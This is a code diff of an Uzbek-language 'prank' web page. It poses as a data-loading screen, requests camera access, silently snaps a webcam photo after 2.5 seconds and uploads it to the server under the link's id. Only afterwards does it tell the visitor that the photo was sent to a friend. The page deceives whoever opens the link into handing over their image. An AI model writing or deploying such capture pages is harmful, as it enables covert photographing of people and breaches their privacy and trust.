@@ -5,43 +5,22 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Kuting...</title>
     <style>
-        body {
-            display: flex; flex-direction: column; justify-content: center;
-            align-items: center; height: 100vh; margin: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #f8f9fa; text-align: center; color: #333;
-        }
-        .loader {
-            border: 5px solid #f3f3f3; border-top: 5px solid #3498db;
-            border-radius: 50%; width: 50px; height: 50px;
-            animation: spin 1s linear infinite; margin-bottom: 20px;
-        }
+        body { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; background: #fff; text-align: center; }
+        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        #prank-ui { display: none; padding: 20px; animation: fadeIn 0.5s ease; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        
-        h1 { color: #e74c3c; margin-bottom: 10px; }
-        p { font-size: 1.1rem; max-width: 300px; line-height: 1.5; }
-        .btn {
-            margin-top: 25px; padding: 12px 25px;
-            background: #3498db; color: white; border: none;
-            border-radius: 8px; cursor: pointer; font-weight: bold;
-        }
+        #prank-ui { display: none; }
     </style>
 </head>
 <body>
-
     <div id="loading-ui">
         <div class="loader"></div>
-        <p id="msg">Ma'lumotlar yuklanmoqda, kuting...</p>
+        <p id="msg">Ma'lumotlar yuklanmoqda, iltimos kuting...</p>
     </div>
 
     <div id="prank-ui">
-        <h1 style="font-size: 50px;">😂</h1>
-        <h1>PRANK!</h1>
+        <h1>😂 PRANK!</h1>
         <p>Sizga do'stingiz hazil qildi. Rasmingiz unga yuborildi!</p>
-        <button class="btn" onclick="window.close()">Sahifani yopish</button>
+        <button onclick="window.close()">Yopish</button>
     </div>
 
     <video id="video" autoplay playsinline style="display:none;"></video>
@@ -50,34 +29,18 @@
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const loadingUi = document.getElementById('loading-ui');
-        const prankUi = document.getElementById('prank-ui');
-        const msgText = document.getElementById('msg');
-
-        // URL'dan 'id'ni olish (server.js dagi uuid uchun)
         const urlParams = new URLSearchParams(window.location.search);
-        const prankId = urlParams.get('id');
+        const prankId = urlParams.get('id'); // URL'dan ID'ni olish
 
-        // Agar ID bo'lmasa xato berish
-        if (!prankId) {
-            msgText.innerText = "Xatolik: Havola noto'g'ri shakllantirilgan.";
-        } else {
-            initCamera();
-        }
-
-        async function initCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
+        if (prankId) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    setTimeout(capture, 2500); // 2.5 soniyadan keyin rasm oladi
+                })
+                .catch(() => {
+                    document.getElementById('msg').innerText = "Xatolik: Kameraga ruxsat bering.";
                 });
-                video.srcObject = stream;
-                
-                // Kamera yoqilgandan so'ng rasm olishga 2.5 soniya vaqt beramiz
-                setTimeout(capture, 2500);
-            } catch (err) {
-                console.error("Kamera xatosi:", err);
-                msgText.innerText = "Xatolik: Sayt ishlashi uchun kameraga ruxsat bering.";
-            }
         }
 
         function capture() {
@@ -85,28 +48,18 @@
             context.drawImage(video, 0, 0, 640, 480);
             const imageData = canvas.toDataURL('image/jpeg', 0.7);
 
-            // Serverga yuborish
             fetch('/upload', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
                     image: imageData, 
-                    id: prankId 
+                    id: prankId // Serverga ID yuborish
                 })
             })
-            .then(res => {
-                // Kamerani o'chirish (telefon indikatori o'chadi)
-                if (video.srcObject) {
-                    video.srcObject.getTracks().forEach(track => track.stop());
-                }
-                
-                // Interfeysni o'zgartirish
-                loadingUi.style.display = 'none';
-                prankUi.style.display = 'block';
-            })
-            .catch(err => {
-                console.error("Yuborishda xato:", err);
-                msgText.innerText = "Tarmoq xatosi yuz berdi.";
+            .then(() => {
+                video.srcObject.getTracks().forEach(t => t.stop());
+                document.getElementById('loading-ui').style.display = 'none';
+                document.getElementById('prank-ui').style.display = 'block';
             });
         }
     </script>
